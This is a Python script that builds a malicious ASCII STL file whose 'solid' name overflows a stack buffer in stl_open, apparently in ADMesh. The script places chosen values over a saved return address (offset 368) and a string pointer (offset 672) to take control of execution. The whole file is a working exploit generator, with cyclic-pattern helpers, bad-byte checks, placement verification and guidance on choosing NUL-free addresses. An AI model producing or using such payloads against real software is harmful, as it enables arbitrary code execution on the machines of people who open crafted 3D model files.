#!/usr/bin/env python3
"""
make_stl.py — craft an ASCII-STL whose `solid` name overflows stl_open's buffer,
placing attacker-chosen 8-byte little-endian values at chosen pattern offsets.

Target control points (from cyclic-pattern analysis of the real binary):
    offset 368 -> saved return address (frame #1)  = instruction-pointer control
    offset 672 -> dereferenced std::string data ptr = read/write-what-where

The overflow is delivered as the `solid` name via  fscanf(fp, " solid %[^\\n]", buf).
Offsets are measured from the first byte AFTER the `solid ` prefix (the buffer
start), matching how a pattern fed as the solid-name is indexed.

Byte constraints on everything in the buffer (addresses included):
  * 0x0A (newline) is forbidden — %[^\\n] stops there, truncating the overflow.
  * 0x00 is copied fine by %[^\\n], BUT if any std::string/strlen touches the
    buffer before your offset, a NUL will truncate it. Prefer NUL-free addresses
    where the target's boot-stable libc lets you (shared cache is stable per boot).
"""
import argparse, struct, string, sys

def de_bruijn(alphabet, n):
    k = len(alphabet); a = [0]*k*n; seq = []
    def db(t, p):
        if t > n:
            if n % p == 0: seq.extend(a[1:p+1])
        else:
            a[t] = a[t-p]; db(t+1, p)
            for j in range(a[t-p]+1, k):
                a[t] = j; db(t+1, t)
    db(1, 1)
    return bytes(alphabet[i] for i in seq)

def cyclic(length, alphabet=(string.ascii_uppercase+string.ascii_lowercase+string.digits).encode(), n=4):
    seq = de_bruijn(alphabet, n)
    out = (seq * (length//len(seq) + 1))[:length]
    return bytes(out)

def p64(x): return struct.pack("<Q", x)

def build(size, fill, slots, prefix, cyc):
    buf = bytearray(cyclic(size) if cyc else (fill * size))
    for off, val in slots:
        b = p64(val)
        if off + 8 > len(buf):
            buf.extend(fill * (off + 8 - len(buf)))
        buf[off:off+8] = b
    body = prefix + bytes(buf)
    if b"\x0a" in body:
        bad = [i for i,c in enumerate(body) if c == 0x0a]
        sys.exit(f"[!] payload contains newline (0x0a) at {bad} — pick different bytes")
    return body

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ret", default="0x4141414141414141",
                    help="8-byte saved return address (offset --ret-off). REPLACE with a real one.")
    ap.add_argument("--ptr", default="0x4242424242424242",
                    help="8-byte std::string data pointer (offset --ptr-off). REPLACE with a real one.")
    ap.add_argument("--ret-off", type=int, default=368)
    ap.add_argument("--ptr-off", type=int, default=672)
    ap.add_argument("--size", type=int, default=1024, help="total overflow length")
    ap.add_argument("--fill", default="0x41", help="filler byte when not --cyclic")
    ap.add_argument("--cyclic", action="store_true", help="fill with a de Bruijn pattern (offset-finding)")
    ap.add_argument("--prefix", default="solid ", help="bytes before the buffer (default 'solid ')")
    ap.add_argument("--no-facet", action="store_true", help="omit the trailing facet (default appends one, matching ADMesh path)")
    ap.add_argument("-o", "--out", default="attack.stl")
    a = ap.parse_args()

    ret = int(a.ret, 0); ptr = int(a.ptr, 0); fill = bytes([int(a.fill, 0)])
    slots = [(a.ret_off, ret), (a.ptr_off, ptr)]
    body = build(a.size, fill, slots, a.prefix.encode(), a.cyclic)
    # ADMesh path: solid<name>\n + one facet + endsolid (matches the live PoC)
    data = body
    if not a.no_facet:
        data += (b"\nfacet normal 0 0 0\n outer loop\n"
                 b"  vertex 0 0 0\n  vertex 1 0 0\n  vertex 0 1 0\n"
                 b" endloop\nendfacet\nendsolid\n")
    open(a.out, "wb").write(data)

    # verify placement (file offset = len(prefix) + pattern offset)
    plen = len(a.prefix)
    for name, off, val in [("ret", a.ret_off, ret), ("ptr", a.ptr_off, ptr)]:
        fo = plen + off
        got = struct.unpack("<Q", data[fo:fo+8])[0]
        assert got == val, f"{name} misplaced"
        print(f"[ok] {name}: pattern off {off} (file off {fo}) = {val:#018x}")
    print(f"[*] wrote {a.out}: {len(data)} bytes")

if __name__ == "__main__":
    main()
